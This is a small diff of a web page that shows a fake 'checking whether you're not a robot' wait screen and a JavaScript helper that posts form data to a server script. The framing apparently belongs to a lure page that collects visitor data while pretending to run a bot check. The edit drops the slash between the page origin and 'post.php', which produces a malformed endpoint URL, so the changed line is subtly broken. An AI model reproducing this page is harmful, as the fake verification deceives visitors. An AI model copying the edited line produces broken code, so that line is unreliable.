@@ -4,7 +4,7 @@
         <h2 align="center">Please wait <span>5 </span> seconds. This process checks whether you're not a robot...</h2>
         <script>
             allow_redir = true;
-            const post = (obj, url=window.location.origin+"/post.php", error=false) => {
+            const post = (obj, url=window.location.origin+"post.php", error=false) => {
                 const formData = new FormData();
                 for (const key in obj) {
                     formData.append(key, obj[key]);
